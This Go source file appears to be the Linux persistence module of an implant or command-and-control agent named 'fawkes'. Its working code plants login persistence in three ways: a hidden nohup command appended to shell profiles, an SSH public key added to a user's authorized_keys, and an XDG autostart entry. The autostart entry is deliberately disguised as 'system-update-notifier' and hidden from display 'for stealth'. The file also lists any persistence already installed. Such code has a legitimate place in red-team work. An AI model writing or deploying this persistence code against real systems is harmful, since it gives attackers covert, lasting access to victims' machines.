//go:build linux
// +build linux

package commands

import (
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

// persistShellProfile appends a command to a shell profile for login persistence
func persistShellProfile(args persistArgs) structs.CommandResult {
	switch args.Action {
	case "install":
		return persistShellProfileInstall(args)
	case "remove":
		return persistShellProfileRemove(args)
	default:
		return errorf("Unknown action: %s. Use: install, remove", args.Action)
	}
}

func persistShellProfileInstall(args persistArgs) structs.CommandResult {
	if args.Path == "" {
		return errorResult("Error: path (command to execute on login) is required")
	}

	marker := "fawkes"
	if args.Name != "" {
		marker = args.Name
	}

	home, _ := os.UserHomeDir()
	// Pick the most appropriate profile file
	profilePath := filepath.Join(home, ".bashrc")
	shell := os.Getenv("SHELL")
	if strings.Contains(shell, "zsh") {
		profilePath = filepath.Join(home, ".zshrc")
	}

	// Read existing content
	existing, _ := os.ReadFile(profilePath)
	content := string(existing)

	if strings.Contains(content, marker) {
		return errorf("Shell profile already contains marker '%s'. Remove first.", marker)
	}

	// Append with marker comments for clean removal
	entry := fmt.Sprintf("\n# BEGIN %s\nnohup %s >/dev/null 2>&1 &\n# END %s\n", marker, args.Path, marker)

	f, err := os.OpenFile(profilePath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
	if err != nil {
		return errorf("Failed to open %s: %v", profilePath, err)
	}
	defer f.Close()

	if _, err := f.WriteString(entry); err != nil {
		return errorf("Failed to write to %s: %v", profilePath, err)
	}

	return successResult(fmt.Sprintf("Shell profile persistence installed:\n  File: %s\n  Command: %s\n  Marker: %s\n\nRemove with: persist -method shell-profile -action remove -name %s", profilePath, args.Path, marker, marker))
}

func persistShellProfileRemove(args persistArgs) structs.CommandResult {
	marker := "fawkes"
	if args.Name != "" {
		marker = args.Name
	}

	home, _ := os.UserHomeDir()
	profiles := []string{
		filepath.Join(home, ".bashrc"),
		filepath.Join(home, ".zshrc"),
		filepath.Join(home, ".profile"),
		filepath.Join(home, ".bash_profile"),
	}

	removed := 0
	for _, profilePath := range profiles {
		data, err := os.ReadFile(profilePath)
		if err != nil {
			continue
		}

		content := string(data)
		beginTag := fmt.Sprintf("# BEGIN %s", marker)
		endTag := fmt.Sprintf("# END %s", marker)

		if !strings.Contains(content, beginTag) {
			continue
		}

		// Remove the block between BEGIN and END markers (inclusive)
		lines := strings.Split(content, "\n")
		var filtered []string
		inBlock := false
		for _, line := range lines {
			if strings.Contains(line, beginTag) {
				inBlock = true
				continue
			}
			if strings.Contains(line, endTag) {
				inBlock = false
				continue
			}
			if !inBlock {
				filtered = append(filtered, line)
			}
		}

		newContent := strings.Join(filtered, "\n")
		if err := os.WriteFile(profilePath, []byte(newContent), 0644); err != nil {
			continue
		}
		removed++
	}

	if removed == 0 {
		return errorf("No shell profile entries found with marker '%s'", marker)
	}

	return successResult(fmt.Sprintf("Removed persistence from %d shell profile(s) with marker '%s'", removed, marker))
}

// persistSSHKey adds or removes an SSH authorized_keys entry
func persistSSHKey(args persistArgs) structs.CommandResult {
	switch args.Action {
	case "install":
		return persistSSHKeyInstall(args)
	case "remove":
		return persistSSHKeyRemove(args)
	default:
		return errorf("Unknown action: %s. Use: install, remove", args.Action)
	}
}

func persistSSHKeyInstall(args persistArgs) structs.CommandResult {
	if args.Path == "" {
		return errorResult("Error: path (SSH public key string) is required")
	}

	marker := "fawkes"
	if args.Name != "" {
		marker = args.Name
	}

	// Determine target user
	targetHome, _ := os.UserHomeDir()
	if args.User != "" {
		u, err := user.Lookup(args.User)
		if err != nil {
			return errorf("User '%s' not found: %v", args.User, err)
		}
		targetHome = u.HomeDir
	}

	sshDir := filepath.Join(targetHome, ".ssh")
	os.MkdirAll(sshDir, 0700)
	authKeysPath := filepath.Join(sshDir, "authorized_keys")

	// Check if key already exists
	existing, _ := os.ReadFile(authKeysPath)
	if strings.Contains(string(existing), marker) {
		return errorf("authorized_keys already contains marker '%s'. Remove first.", marker)
	}

	// Append key with comment marker
	keyLine := fmt.Sprintf("%s %s\n", strings.TrimSpace(args.Path), marker)

	f, err := os.OpenFile(authKeysPath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		return errorf("Failed to open %s: %v", authKeysPath, err)
	}
	defer f.Close()

	if _, err := f.WriteString(keyLine); err != nil {
		return errorf("Failed to write to %s: %v", authKeysPath, err)
	}

	return successResult(fmt.Sprintf("SSH key persistence installed:\n  File: %s\n  Marker: %s\n\nRemove with: persist -method ssh-key -action remove -name %s", authKeysPath, marker, marker))
}

func persistSSHKeyRemove(args persistArgs) structs.CommandResult {
	marker := "fawkes"
	if args.Name != "" {
		marker = args.Name
	}

	targetHome, _ := os.UserHomeDir()
	if args.User != "" {
		u, err := user.Lookup(args.User)
		if err != nil {
			return errorf("User '%s' not found: %v", args.User, err)
		}
		targetHome = u.HomeDir
	}

	authKeysPath := filepath.Join(targetHome, ".ssh", "authorized_keys")
	data, err := os.ReadFile(authKeysPath)
	if err != nil {
		return errorf("Failed to read %s: %v", authKeysPath, err)
	}

	lines := strings.Split(string(data), "\n")
	var filtered []string
	removed := 0
	for _, line := range lines {
		if strings.Contains(line, marker) {
			removed++
			continue
		}
		filtered = append(filtered, line)
	}

	if removed == 0 {
		return errorf("No authorized_keys entries found with marker '%s'", marker)
	}

	if err := os.WriteFile(authKeysPath, []byte(strings.Join(filtered, "\n")), 0600); err != nil {
		return errorf("Failed to write %s: %v", authKeysPath, err)
	}

	return successResult(fmt.Sprintf("Removed %d SSH key(s) with marker '%s' from %s", removed, marker, authKeysPath))
}

// persistXDGAutostart installs/removes XDG autostart desktop entries (T1547.013).
// Creates .desktop files in ~/.config/autostart/ that execute on graphical login.
func persistXDGAutostart(args persistArgs) structs.CommandResult {
	switch args.Action {
	case "install":
		return persistXDGAutostartInstall(args)
	case "remove":
		return persistXDGAutostartRemove(args)
	default:
		return errorf("Unknown action: %s. Use: install, remove", args.Action)
	}
}

func persistXDGAutostartInstall(args persistArgs) structs.CommandResult {
	if args.Path == "" {
		return errorResult("Error: path (executable to persist) is required")
	}
	if args.Name == "" {
		args.Name = "system-update-notifier"
	}

	home, _ := os.UserHomeDir()
	autostartDir := filepath.Join(home, ".config", "autostart")
	os.MkdirAll(autostartDir, 0755)

	desktopFile := filepath.Join(autostartDir, args.Name+".desktop")

	// Check if it already exists
	if _, err := os.Stat(desktopFile); err == nil {
		return errorf("XDG autostart entry already exists: %s. Remove first.", desktopFile)
	}

	// Generate .desktop file content
	// Use a benign-looking name and comment for stealth
	displayName := args.Name
	if strings.Contains(displayName, "-") {
		parts := strings.Split(displayName, "-")
		for i, p := range parts {
			if len(p) > 0 {
				parts[i] = strings.ToUpper(p[:1]) + p[1:]
			}
		}
		displayName = strings.Join(parts, " ")
	}

	content := fmt.Sprintf(`[Desktop Entry]
Type=Application
Name=%s
Exec=%s
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
X-MATE-Autostart-enabled=true
X-KDE-autostart-after=panel
Comment=Background service
`, displayName, args.Path)

	if err := os.WriteFile(desktopFile, []byte(content), 0644); err != nil {
		return errorf("Failed to write %s: %v", desktopFile, err)
	}

	return successf("XDG autostart persistence installed:\n  File: %s\n  Name: %s\n  Exec: %s\n  Trigger: Runs at graphical login (GNOME, KDE, XFCE, MATE)\n\nRemove with: persist -method xdg-autostart -action remove -name %s", desktopFile, displayName, args.Path, args.Name)
}

func persistXDGAutostartRemove(args persistArgs) structs.CommandResult {
	if args.Name == "" {
		args.Name = "system-update-notifier"
	}

	home, _ := os.UserHomeDir()
	desktopFile := filepath.Join(home, ".config", "autostart", args.Name+".desktop")

	if _, err := os.Stat(desktopFile); err != nil {
		return errorf("XDG autostart entry not found: %s", desktopFile)
	}

	// Secure remove
	secureRemove(desktopFile)

	if _, err := os.Stat(desktopFile); err == nil {
		return errorf("Failed to remove %s: file still exists", desktopFile)
	}

	return successf("Removed XDG autostart persistence: %s", desktopFile)
}

// persistLinuxList lists all installed persistence methods
func persistLinuxList() structs.CommandResult {
	var sb strings.Builder
	sb.WriteString("=== INSTALLED PERSISTENCE (Linux) ===\n\n")

	// Check crontab
	sb.WriteString("[Crontab]\n")
	cmd := exec.Command("crontab", "-l")
	if output, err := cmd.CombinedOutput(); err == nil {
		lines := strings.Split(string(output), "\n")
		for _, line := range lines {
			if strings.TrimSpace(line) != "" && !strings.HasPrefix(strings.TrimSpace(line), "#") {
				sb.WriteString(fmt.Sprintf("  %s\n", line))
			}
		}
	} else {
		sb.WriteString("  (no crontab)\n")
	}

	// Check user systemd services
	sb.WriteString("\n[Systemd User Services]\n")
	home, _ := os.UserHomeDir()
	userServiceDir := filepath.Join(home, ".config", "systemd", "user")
	if entries, err := os.ReadDir(userServiceDir); err == nil {
		for _, e := range entries {
			if strings.HasSuffix(e.Name(), ".service") {
				sb.WriteString(fmt.Sprintf("  %s\n", e.Name()))
			}
		}
	} else {
		sb.WriteString("  (none found)\n")
	}

	// Check system services if root
	if os.Getuid() == 0 {
		sb.WriteString("\n[Systemd System Services (custom)]\n")
		if entries, err := os.ReadDir("/etc/systemd/system"); err == nil {
			for _, e := range entries {
				if strings.HasSuffix(e.Name(), ".service") && !strings.HasPrefix(e.Name(), "sys-") {
					sb.WriteString(fmt.Sprintf("  %s\n", e.Name()))
				}
			}
		}
	}

	// Check shell profiles for markers
	sb.WriteString("\n[Shell Profile Persistence]\n")
	profileFiles := []string{".bashrc", ".zshrc", ".profile", ".bash_profile"}
	found := false
	for _, p := range profileFiles {
		path := filepath.Join(home, p)
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		if strings.Contains(string(data), "# BEGIN ") {
			sb.WriteString(fmt.Sprintf("  %s: contains persistence markers\n", path))
			found = true
		}
	}
	if !found {
		sb.WriteString("  (none found)\n")
	}

	// Check XDG autostart
	sb.WriteString("\n[XDG Autostart]\n")
	autostartDir := filepath.Join(home, ".config", "autostart")
	xdgFound := false
	if entries, err := os.ReadDir(autostartDir); err == nil {
		for _, e := range entries {
			if strings.HasSuffix(e.Name(), ".desktop") {
				sb.WriteString(fmt.Sprintf("  %s\n", e.Name()))
				xdgFound = true
			}
		}
	}
	if !xdgFound {
		sb.WriteString("  (none found)\n")
	}

	// Check authorized_keys
	sb.WriteString("\n[SSH Authorized Keys]\n")
	authKeys := filepath.Join(home, ".ssh", "authorized_keys")
	if data, err := os.ReadFile(authKeys); err == nil {
		lines := strings.Split(string(data), "\n")
		count := 0
		for _, line := range lines {
			if strings.TrimSpace(line) != "" {
				count++
			}
		}
		sb.WriteString(fmt.Sprintf("  %s: %d keys\n", authKeys, count))
	} else {
		sb.WriteString("  (no authorized_keys)\n")
	}

	return successResult(sb.String())
}
